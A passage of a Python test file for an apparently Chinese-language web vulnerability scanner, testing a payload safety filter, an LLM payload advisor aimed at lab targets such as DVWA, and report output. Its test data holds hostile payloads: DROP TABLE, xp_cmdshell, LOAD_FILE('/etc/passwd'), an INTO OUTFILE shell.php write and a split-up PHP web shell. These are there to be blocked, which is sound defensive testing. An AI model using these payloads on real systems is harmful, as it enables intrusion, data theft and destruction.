            "expected_false_signal": "User ID is MISSING from the database.",
            "purpose": "验证布尔条件响应差异",
        },
        {"category": "sqli", "target_param": "id", "payload": "1'; DROP TABLE users; #"},
        {"category": "sqli", "target_param": "id", "payload": "1' UNION SELECT 'x' INTO OUTFILE '" + "shell" + "." + "php" + "' #"},
        {"category": "command_injection", "target_param": "cmd", "payload": "1; EXEC xp_cmdshell 'whoami' --"},
        {"category": "sqli_blind", "target_param": "id", "payload": "1' OR SLEEP(30)--"},
    ]

    results = filter_.filter_many(candidates)

    allowed = [item for item in results if item["allowed"]]
    blocked = [item for item in results if not item["allowed"]]
    assert len(allowed) == 2
    assert {item["pair_role"] for item in allowed} == {"true", "false"}
    assert "1' AND '1'='1' -- -" in {item["payload"] for item in allowed}
    assert len(blocked) == 4
    assert all(item["payload"].startswith("[已过滤]") for item in blocked)


def test_llm_payload_safety_filter_allows_read_only_sqli_progression() -> None:
    filter_ = PayloadSafetyFilter()
    results = filter_.filter_many(
        [
            {
                "input_point": "http://example.com/Less-1/?id=1",
                "category": "sqli_progression",
                "target_param": "id",
                "payload": "-1' UNION SELECT 1,database(),version() -- -",
                "purpose": "确认 SQLi 后读取库名和版本",
            },
            {
                "input_point": "http://example.com/Less-1/?id=1",
                "category": "sqli_progression",
                "target_param": "id",
                "payload": "1' UNION SELECT LOAD_FILE('/etc/passwd') -- -",
            },
        ]
    )

    allowed = [item for item in results if item["allowed"]]
    blocked = [item for item in results if not item["allowed"]]
    assert len(allowed) == 1
    assert allowed[0]["category"] == "sqli_progression"
    assert allowed[0]["category_label"] == "SQL 注入推进候选"
    assert "database()" in allowed[0]["payload"]
    assert allowed[0]["payload"].endswith("-- -")
    assert len(blocked) == 1
    assert "LOAD_FILE" in blocked[0]["filter_reason"]


def test_llm_payload_safety_filter_allows_benign_upload_and_blocks_script_upload() -> None:
    filter_ = PayloadSafetyFilter()
    results = filter_.filter_many(
        [
            {
                "input_point": "http://example.com/upload",
                "category": "file_upload",
                "target_param": "avatar",
                "payload": "filename=nova-upload-check.txt; content=NOVA_UPLOAD_CHECK_SAFE; content_type=text/plain",
                "purpose": "上传 harmless 文本文件验证上传入口",
            },
            {
                "input_point": "http://example.com/upload",
                "category": "file_upload",
                "target_param": "avatar",
                "payload": (
                    "filename="
                    + "shell"
                    + "."
                    + "php"
                    + "; content="
                    + "<"
                    + "?php "
                    + "sys"
                    + "tem($_GET['c"
                    + "md']); ?>"
                    + "; content_type=application/x-"
                    + "php"
                ),
                "purpose": "危险脚本上传",
            },
        ]
    )

    allowed = [item for item in results if item["allowed"]]
    blocked = [item for item in results if not item["allowed"]]
    assert len(allowed) == 1
    assert allowed[0]["category"] == "file_upload"
    assert "nova-upload-check.txt" in allowed[0]["payload"]
    assert len(blocked) == 1
    assert "后门文件" in blocked[0]["filter_reason"]


def test_llm_payload_safety_filter_keeps_safe_poc_flow_and_redacts_dangerous_steps() -> None:
    filter_ = PayloadSafetyFilter()
    results = filter_.filter_many(
        [
            {
                "input_point": "http://example.com/exec",
                "category": "command_injection",
                "target_param": "ip",
                "payload": "127.0.0.1; echo NOVA_CMD",
                "purpose": "验证命令注入 echo 标记",
                "expected_signal": "响应出现 NOVA_CMD",
                "source": "llm_progression",
                "poc_title": "LLM 命令注入手工 PoC",
                "attack_flow": [
                    "确认当前目标是授权靶场或自有系统",
                    "把 ip 参数替换为 echo 标记 payload",
                    "导出全部数据后横向移动",
                ],
                "usage_advice": "仅报告参考，不自动执行",
            }
        ]
    )

    assert results[0]["allowed"] is True
    assert results[0]["source"] == "llm_progression"
    assert results[0]["poc_title"] == "LLM 命令注入手工 PoC"
    assert results[0]["attack_flow"][0] == "确认当前目标是授权靶场或自有系统"
    assert results[0]["attack_flow"][-1].startswith("[已过滤步骤")
    assert results[0]["usage_advice"] == "仅报告参考，不自动执行"


def test_llm_payload_advisor_parses_json_and_does_not_change_findings(monkeypatch) -> None:
    def fake_chat(self, system_prompt: str, user_prompt: str) -> str:
        return """
        {
          "payloads": [
            {
              "input_point": "http://example.com/sqli_blind/",
              "category": "sqli_blind",
              "target_param": "id",
              "true_payload": "1' AND '1'='1' -- -",
              "false_payload": "1' AND '1'='2' -- -",
              "expected_true_signal": "exists",
              "expected_false_signal": "MISSING",
              "purpose": "验证盲注布尔差异"
            }
          ]
        }
        """

    monkeypatch.setattr("backend.helper.llm.client.LLMClient.chat", fake_chat)
    webscan = {
        "target": "http://example.com/sqli_blind/",
        "final_url": "http://example.com/sqli_blind/",
        "pages": [{"input_points": [{"name": "id", "method": "GET", "url": "http://example.com/sqli_blind/"}]}],
    }
    findings = [{"id": "NOVA-Q-001", "title": "URL 参数需要注入风险验证", "status": "待验证"}]

    result = LLMPayloadAdvisor(settings(llm_baseurl="http://llm.local", llm_apikey="k", llm_provider="deepseek")).generate(webscan, findings)

    assert result["status"] == "ok"
    assert result["summary"]["allowed"] >= 2
    assert result["items"][0]["allowed"] is True
    assert findings[0]["status"] == "待验证"


def test_payload_advisor_adds_confirmed_sqli_progression_templates(monkeypatch) -> None:
    def fail_if_called(*_args, **_kwargs):
        raise AssertionError("local targets should skip LLM network calls when disabled")

    monkeypatch.setattr("backend.helper.llm.client.LLMClient.chat", fail_if_called)
    webscan = {
        "target": "http://127.0.0.1/sqli-labs-master/Less-1/?id=1",
        "final_url": "http://127.0.0.1/sqli-labs-master/Less-1/?id=1",
        "pages": [
            {
                "final_url": "http://127.0.0.1/sqli-labs-master/Less-1/?id=1",
                "input_points": [
                    {
                        "name": "id",
                        "method": "GET",
                        "url": "http://127.0.0.1/sqli-labs-master/Less-1/?id=1",
                        "active_testable": True,
                        "type": "text",
                    }
                ],
            }
        ],
    }
    findings = [
        {
            "id": "NOVA-SQLI-001",
            "title": "确认存在 SQL 注入错误回显",
            "status": "确认漏洞",
            "category": "sqli",
            "url": "http://127.0.0.1/sqli-labs-master/Less-1/?id=1%27",
            "payloads": ["1'", "1' ORDER BY 1 -- -", "-1' UNION SELECT 'NOVA1','NOVA2','NOVA3' -- -"],
            "request_response": {
                "followup": {
                    "column_count": 3,
                    "union_probe": {"reflected_markers": ["NOVA2", "NOVA3"]},
                    "union_marker_reflected": True,
                }
            },
        }
    ]

    result = LLMPayloadAdvisor(
        settings(llm_baseurl="http://llm.local", llm_apikey="k", llm_provider="deepseek", llm_on_local_targets=False)
    ).generate(
        webscan,
        findings,
    )

    allowed = [item for item in result["items"] if item["allowed"]]
    progression = [item for item in allowed if item["source"] == "local_progression_template"]
    assert progression
    assert any("database()" in item["payload"] for item in progression)
    assert any("information_schema.tables" in item["payload"] for item in progression)
    assert {item["target_param"] for item in progression} == {"id"}


def test_llm_payload_advisor_calls_progression_prompt_for_confirmed_findings(monkeypatch) -> None:
    calls: list[str] = []

    def fake_chat(self, system_prompt: str, user_prompt: str) -> str:
        calls.append(system_prompt)
        if "Confirmed Vulnerability Payload Advisor" not in system_prompt:
            return '{"payloads": []}'
        assert "column_count" in user_prompt
        return """
        {
          "payloads": [
            {
              "input_point": "http://example.com/Less-1/?id=1",
              "category": "sqli_progression",
              "target_param": "id",
              "payload": "-1' UNION SELECT 1,database(),3 -- -",
              "purpose": "确认后读取当前数据库名",
              "expected_signal": "响应中出现数据库名",
              "risk_note": "仅报告参考，不自动执行"
            }
          ]
        }
        """

    monkeypatch.setattr("backend.helper.llm.client.LLMClient.chat", fake_chat)
    webscan = {
        "target": "http://example.com/Less-1/?id=1",
        "final_url": "http://example.com/Less-1/?id=1",
        "pages": [{"input_points": [{"name": "id", "method": "GET", "url": "http://example.com/Less-1/?id=1"}]}],
    }
    findings = [
        {
            "id": "NOVA-SQLI-001",
            "title": "确认存在 SQL 注入错误回显",
            "status": "确认漏洞",
            "category": "sqli",
            "url": "http://example.com/Less-1/?id=1%27",
            "payloads": ["1'"],
            "request_response": {"followup": {"column_count": 3, "union_probe": {"reflected_markers": ["NOVA2"]}}},
        }
    ]

    result = LLMPayloadAdvisor(settings(llm_baseurl="http://llm.local", llm_apikey="k", llm_provider="deepseek")).generate(
        webscan,
        findings,
    )

    assert len(calls) == 2
    assert result["summary"]["llm_candidates"] == 1
    assert any(item["source"] == "llm_progression" and "database()" in item["payload"] for item in result["items"])


def test_llm_payload_advisor_limits_llm_payloads_to_key_total(monkeypatch) -> None:
    def fake_chat(self, system_prompt: str, user_prompt: str) -> str:
        if "Confirmed Vulnerability Payload Advisor" not in system_prompt:
            payloads = [
                {
                    "input_point": "http://example.com/search?q=1",
                    "category": "xss",
                    "target_param": "q",
                    "payload": f"<script>alert('NOVA_{index}')</script>",
                    "purpose": f"基础候选 {index}",
                    "expected_signal": "alert",
                    "risk_note": "仅报告",
                }
                for index in range(8)
            ]
        else:
            payloads = [
                {
                    "input_point": "http://example.com/Less-1/?id=1",
                    "category": "sqli_progression",
                    "target_param": "id",
                    "payload": f"-1' UNION SELECT 1,{index},3 -- -",
                    "purpose": f"推进候选 {index}",
                    "expected_signal": "响应出现标记",
                    "risk_note": "仅报告",
                }
                for index in range(8)
            ]
        return json.dumps({"payloads": payloads}, ensure_ascii=False)

    monkeypatch.setattr("backend.helper.llm.client.LLMClient.chat", fake_chat)
    webscan = {
        "target": "http://example.com/Less-1/?id=1",
        "final_url": "http://example.com/Less-1/?id=1",
        "pages": [{"input_points": [{"name": "id", "method": "GET", "url": "http://example.com/Less-1/?id=1"}]}],
    }
    findings = [
        {
            "id": "NOVA-SQLI-001",
            "title": "确认存在 SQL 注入",
            "status": "确认漏洞",
            "category": "sqli",
            "url": "http://example.com/Less-1/?id=1%27",
            "payloads": ["1'"],
            "request_response": {"followup": {"column_count": 3}},
        }
    ]

    result = LLMPayloadAdvisor(
        settings(
            llm_baseurl="http://llm.local",
            llm_apikey="k",
            llm_provider="deepseek",
            llm_payload_max_per_param=20,
            llm_payload_max_total=10,
        )
    ).generate(webscan, findings)

    llm_items = [item for item in result["items"] if str(item.get("source") or "").startswith("llm")]
    assert len(llm_items) == 10
    assert result["summary"]["llm_candidates"] == 10
    assert sum(1 for item in llm_items if item["source"] == "llm_progression") == 8
    assert sum(1 for item in llm_items if item["source"] == "llm") == 2


def test_payload_advisor_adds_contextual_pairs_and_does_not_target_submit(monkeypatch) -> None:
    def fail_if_called(*_args, **_kwargs):
        raise AssertionError("local targets should skip LLM network calls when disabled")

    monkeypatch.setattr("backend.helper.llm.client.LLMClient.chat", fail_if_called)
    webscan = {
        "target": "http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/",
        "final_url": "http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/",
        "pages": [
            {
                "final_url": "http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/",
                "input_points": [
                    {
                        "name": "id",
                        "method": "GET",
                        "url": "http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=&Submit=Submit",
                        "active_testable": True,
                        "type": "text",
                    },
                    {
                        "name": "Submit",
                        "method": "GET",
                        "url": "http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=&Submit=Submit",
                        "active_testable": False,
                        "type": "submit",
                    },
                ],
            }
        ],
    }

    result = LLMPayloadAdvisor(
        settings(llm_baseurl="http://llm.local", llm_apikey="k", llm_provider="deepseek", llm_on_local_targets=False)
    ).generate(
        webscan,
        [],
    )

    allowed = [item for item in result["items"] if item["allowed"]]
    assert result["summary"]["local_candidates"] >= 2
    assert {item["target_param"] for item in allowed} == {"id"}
    assert any(item["pair_role"] == "true" for item in allowed)
    assert any(item["pair_role"] == "false" for item in allowed)
    assert any("单条响应不能证明漏洞成立" in item["purpose"] for item in allowed)


def test_llm_payload_advisor_generates_local_file_upload_poc_without_llm() -> None:
    webscan = {
        "target": "http://127.0.0.1/DVWA/vulnerabilities/upload/",
        "final_url": "http://127.0.0.1/DVWA/vulnerabilities/upload/",
        "forms": [
            {
                "method": "POST",
                "action": "http://127.0.0.1/DVWA/vulnerabilities/upload/",
                "enctype": "multipart/form-data",
                "inputs": [
                    {"name": "MAX_FILE_SIZE", "type": "hidden", "value": "100000"},
                    {"name": "uploaded", "type": "file", "value": ""},
                    {"name": "user_token", "type": "hidden", "value": "token"},
                    {"name": "Upload", "type": "submit", "value": "Upload"},
                ],
                "candidate_purpose": "file_upload",
                "file_inputs": [{"name": "uploaded", "type": "file", "value": ""}],
            }
        ],
        "pages": [],
    }

    result = LLMPayloadAdvisor(settings(llm_payload_advisor=True)).generate(webscan, [])
    allowed = [item for item in result["items"] if item["allowed"] and item["category"] == "file_upload"]

    assert result["status"] in {"ok", "local_only"}
    assert result["summary"]["local_candidates"] >= 2
    assert len(allowed) >= 2
    assert {item["target_param"] for item in allowed} == {"uploaded"}
    assert any("nova-upload-check.txt" in item["payload"] for item in allowed)
    assert any("user_token" in item["risk_note"] for item in allowed)


def test_llm_payload_advisor_non_json_degrades(monkeypatch) -> None:
    def fake_chat(self, system_prompt: str, user_prompt: str) -> str:
        return "这里不是 JSON"

    monkeypatch.setattr("backend.helper.llm.client.LLMClient.chat", fake_chat)
    result = LLMPayloadAdvisor(settings(llm_baseurl="http://llm.local", llm_apikey="k", llm_provider="deepseek")).generate({}, [])

    assert result["status"] == "unavailable"
    assert result["items"] == []


def test_llm_client_retries_transient_ssl_failure(monkeypatch) -> None:
    from backend.helper.llm.client import LLMClient

    attempts = {"count": 0}

    class FakeResponse:
        def raise_for_status(self) -> None:
            return None

        def json(self) -> dict[str, object]:
            return {"choices": [{"message": {"content": "OK"}}]}

    def fake_post(*_args, **_kwargs):
        attempts["count"] += 1
        if attempts["count"] == 1:
            raise requests.exceptions.SSLError("SSL: UNEXPECTED_EOF_WHILE_READING")
        return FakeResponse()

    monkeypatch.setattr("backend.helper.llm.client.requests.post", fake_post)

    result = LLMClient(
        settings(
            llm_baseurl="https://api.deepseek.com",
            llm_apikey="sk-test",
            llm_model="deepseek-v4-flash",
            llm_provider="deepseek",
            llm_request_timeout=5,
            llm_request_retries=1,
        )
    ).chat("system", "user")

    assert result == "OK"
    assert attempts["count"] == 2


def test_report_contains_probe_payloads_status_evidence_and_llm_advice(tmp_path: Path, monkeypatch) -> None:
    monkeypatch.setenv("NOVA_REPORT_CONFIRMED_ONLY", "false")
    audit = {
        "target": "http://example.com/?q=1",
        "audited_at": "2026-05-22T00:00:00+00:00",
        "findings": [
            {
                "id": "NOVA-Q-001",
                "title": "URL 参数需要注入风险验证",
                "severity": "Low",
                "confidence": "Medium",
                "status": "待验证",
                "category": "injection",
                "url": "http://example.com/?q=1",
                "evidence": "目标 URL 中发现参数：q。",
                "payloads": ["' OR '1'='1"],
                "request_response": {"status_code": 200, "body_length": 123, "matched": "demo"},
                "recommendation": "校验输入。",
                "llm_analysis": "",
            }
        ],
        "llm_payload_advice": [
            {
                "input_point": "http://example.com/?q=1",
                "category": "sqli_blind",
                "target_param": "q",
                "payload": "1' AND '1'='1' -- -",
                "allowed": True,
                "filter_reason": "通过本地非破坏性 Safety Filter",
                "purpose": "验证布尔条件响应差异",
                "expected_signal": "exists",
                "risk_note": "",
                "source": "llm",
                "poc_title": "LLM 布尔 SQLi 手工 PoC",
                "attack_flow": ["在授权环境把 q 参数替换为 PoC payload", "比较 true/false 响应差异"],
                "usage_advice": "只在靶场或授权目标中手工验证",
            },
            {
                "input_point": "http://example.com/?q=1",
                "category": "sqli",
                "target_param": "q",
                "payload": "[已过滤] 1'; DROP...users;",
                "allowed": False,
                "filter_reason": "包含破坏性 SQL 关键字 DROP",
                "purpose": "",
                "expected_signal": "",
                "risk_note": "",
            },
        ],
        "llm_payload_summary": {
            "enabled": True,
            "status": "ok",
            "message": "ok",
            "report_only": True,
            "generated": 2,
            "allowed": 1,
            "blocked": 1,
        },
    }
    probe = {
        "reachable": True,
        "final_url": "http://example.com/?q=1",
        "status_code": 200,
        "auth_required": False,
        "auth_type_guess": "none",
        "in_scope": True,
        "dns": {"addresses": ["127.0.0.1"]},
        "tls": {"valid": None},
        "auth": auth_summary({"Authorization": "Bearer secret"}),
        "redirect_chain": [],
        "probe_errors": [],
    }

    report, json_path, markdown_path = PayloadAgent().build_report(
        "http://example.com/?q=1",
        {"status_code": 200, "title": "Mock"},
        audit,
        tmp_path,
        target_probe=probe,
    )

    assert report["summary"]["risk_level"] == "Low"
    assert report["summary"]["llm_payload_allowed"] == 1
    assert report["summary"]["finding_types"][0]["label"] == "输入点注入风险待验证"
    assert json_path.exists()
    markdown = markdown_path.read_text(encoding="utf-8-sig")
    assert "# NOVA 扫描报告" in markdown
    assert "## 目标探测结果" in markdown
    assert "## 漏洞类型汇总" in markdown
    assert "输入点注入风险待验证" in markdown
    assert "状态：待验证" in markdown
    assert "status=200" in markdown
    assert "' OR '1'='1" in markdown
    assert "## 候选 Payload" in markdown
    assert "## LLM PoC 与授权验证流程" in markdown
    assert "LLM 布尔 SQLi 手工 PoC" in markdown
    assert "比较 true/false 响应差异" in markdown
    assert "1' AND '1'='1' -- -" in markdown
    assert "包含破坏性 SQL 关键字 DROP" in markdown
    assert "Bearer secret" not in markdown


def test_report_uses_vulnerability_name_and_timestamp_without_overwriting(tmp_path: Path, monkeypatch) -> None:
    monkeypatch.delenv("NOVA_REPORT_CONFIRMED_ONLY", raising=False)
    audit = {
        "target": "http://example.com/?q=1",
        "audited_at": "2026-05-30T12:34:56+00:00",
        "findings": [
            {
                "id": "NOVA-SQLI-001",
                "title": "确认存在 SQL 注入错误回显",
                "severity": "High",
                "confidence": "High",
                "status": "确认漏洞",
                "category": "sqli",
                "url": "http://example.com/?q=1",
                "evidence": "SQL error",
                "payloads": ["1'"],
                "request_response": {},
                "recommendation": "use prepared statements",
                "llm_analysis": "",
            }
        ],
        "llm_payload_advice": [],
        "llm_payload_summary": {"enabled": False, "status": "disabled", "message": "", "report_only": True},
    }
    agent = PayloadAgent()

    first_report, first_json, first_md = agent.build_report(
        "http://example.com/?q=1",
        {"status_code": 200, "title": "Mock"},
        audit,
        tmp_path,
        target_probe={"reachable": True, "auth": {}, "redirect_chain": [], "probe_errors": []},
    )
    second_report, second_json, second_md = agent.build_report(
        "http://example.com/?q=1",
        {"status_code": 200, "title": "Mock"},
        audit,
        tmp_path,
        target_probe={"reachable": True, "auth": {}, "redirect_chain": [], "probe_errors": []},
    )

    assert first_json.exists()
    assert first_md.exists()
    assert second_json.exists()
    assert second_md.exists()
    assert first_json != second_json
    assert first_md != second_md
    assert first_md.parent == first_json.parent
    assert second_md.parent == second_json.parent
    assert first_md.parent != second_md.parent
    assert first_md.parent.exists()
    assert second_md.parent.exists()
    assert first_md.parent.name == "20260530_123456"
    assert second_md.parent.name == "20260530_123456_2"
    assert first_md.name.startswith("SQL_注入")
    assert "20260530_123456" in first_md.name
    assert first_report["summary"]["report_basename"] == first_md.stem
    assert first_report["summary"]["report_folder"] == "20260530_123456"
    assert second_report["summary"]["report_basename"] == second_md.stem
    assert second_report["summary"]["report_folder"] == "20260530_123456_2"
    assert not (tmp_path / "scan_report.md").exists()
    assert not (tmp_path / "payload_report.md").exists()


def test_report_hides_non_confirmed_findings_by_default(tmp_path: Path, monkeypatch) -> None:
    monkeypatch.delenv("NOVA_REPORT_CONFIRMED_ONLY", raising=False)
    audit = {
        "target": "http://example.com/?q=1",
        "audited_at": "2026-05-22T00:00:00+00:00",
        "findings": [
            {
                "id": "NOVA-H-001",
                "title": "缺少 Content-Security-Policy 响应头",
                "severity": "Medium",
                "confidence": "High",
                "status": "配置建议",
                "category": "security_header",
                "url": "http://example.com/",
                "evidence": "header missing",
                "payloads": [],
                "request_response": {},
                "recommendation": "fix header",
                "llm_analysis": "",
            },
            {
                "id": "NOVA-SQLI-001",
                "title": "确认存在 SQL 注入错误回显",
                "severity": "High",
                "confidence": "High",
                "status": "确认漏洞",
                "category": "sqli",
                "url": "http://example.com/?q=1",
                "evidence": "SQL error",
                "payloads": ["1'", "1' ORDER BY 1 -- -"],
                "request_response": {},
                "recommendation": "use prepared statements",
                "llm_analysis": "",
            },
        ],
        "llm_payload_advice": [],
        "llm_payload_summary": {"enabled": False, "status": "disabled", "message": "", "report_only": True},
    }

    report, _, markdown_path = PayloadAgent().build_report(
        "http://example.com/?q=1",
        {"status_code": 200, "title": "Mock"},
        audit,
        tmp_path,
        target_probe={"reachable": True, "auth": {}, "redirect_chain": [], "probe_errors": []},
    )

    markdown = markdown_path.read_text(encoding="utf-8-sig")
    assert report["summary"]["total_findings"] == 1
    assert report["summary"]["raw_total_findings"] == 2
    assert "确认存在 SQL 注入错误回显" in markdown
    assert "缺少 Content-Security-Policy" not in markdown


def test_report_shows_verifiable_candidates_by_default(tmp_path: Path, monkeypatch) -> None:
    monkeypatch.delenv("NOVA_REPORT_CONFIRMED_ONLY", raising=False)
    monkeypatch.delenv("NOVA_REPORT_VERIFIABLE_CANDIDATES", raising=False)
    audit = {
        "target": "http://example.com/fetch?url=http://example.org",
        "audited_at": "2026-05-22T00:00:00+00:00",
        "findings": [
            {
                "id": "NOVA-H-001",
                "title": "缺少 Content-Security-Policy 响应头",
                "severity": "Medium",
                "confidence": "High",
                "status": "配置建议",
                "category": "security_header",
                "url": "http://example.com/",
                "evidence": "header missing",
                "payloads": [],
                "request_response": {},
                "recommendation": "fix header",
                "llm_analysis": "",
            },
            {
                "id": "NOVA-SSRF-001",
                "title": "疑似 SSRF URL 输入点",
                "severity": "Medium",
                "confidence": "Medium",
                "status": "疑似漏洞",
                "category": "ssrf",
                "url": "http://example.com/fetch?url=http://example.org",
                "evidence": "参数 url 表现为服务端请求 URL 的候选点。",
                "payloads": ["配置 NOVA_SSRF_CALLBACK_URL 后使用专属 callback URL 验证"],
                "request_response": {},
                "details": {"target_param": "url", "opt_in_required": "NOVA_SSRF_CALLBACK_URL"},
                "recommendation": "validate outbound URL",
                "llm_analysis": "",
            },
        ],
        "llm_payload_advice": [
            {
                "input_point": "http://example.com/fetch?url=http://example.org",
                "category": "ssrf",
                "target_param": "url",
                "payload": "https://callback.example.test/nova",
                "allowed": True,
                "filter_reason": "通过本地非破坏性 Safety Filter",
                "purpose": "配置 callback 后手工验证 SSRF",
                "expected_signal": "callback 命中",
                "risk_note": "仅报告参考",
                "source": "llm",
            }
        ],
        "llm_payload_summary": {"enabled": True, "status": "ok", "message": "ok", "report_only": True},
    }

    report, _, markdown_path = PayloadAgent().build_report(
        "http://example.com/fetch?url=http://example.org",
        {"status_code": 200, "title": "Mock"},
        audit,
        tmp_path,
        target_probe={"reachable": True, "auth": {}, "redirect_chain": [], "probe_errors": []},
    )

    markdown = markdown_path.read_text(encoding="utf-8-sig")
    assert report["summary"]["total_findings"] == 1
    assert report["summary"]["report_verifiable_candidates"] is True
    assert "疑似 SSRF URL 输入点" in markdown
    assert "LLM 后续 payload" in markdown
    assert "callback.example.test" in markdown
    assert "缺少 Content-Security-Policy" not in markdown


def test_report_notes_llm_unavailable(tmp_path: Path) -> None:
    audit = {
        "target": "http://example.com",
        "audited_at": "2026-05-22T00:00:00+00:00",
        "findings": [],
        "llm_payload_advice": [],
        "llm_payload_summary": {
            "enabled": True,
            "status": "unavailable",
            "message": "LLM 未配置或不可用",
            "report_only": True,
            "generated": 0,
            "allowed": 0,
            "blocked": 0,
        },
    }
    report, _, markdown_path = PayloadAgent().build_report(
        "http://example.com",
        {"status_code": 200, "title": "Mock"},
        audit,
        tmp_path,
        target_probe={"reachable": True, "auth": {}, "redirect_chain": [], "probe_errors": []},
    )

    markdown = markdown_path.read_text(encoding="utf-8-sig")
    assert report["summary"]["total_findings"] == 0
    assert "候选 Payload 未启用或不可用" in markdown
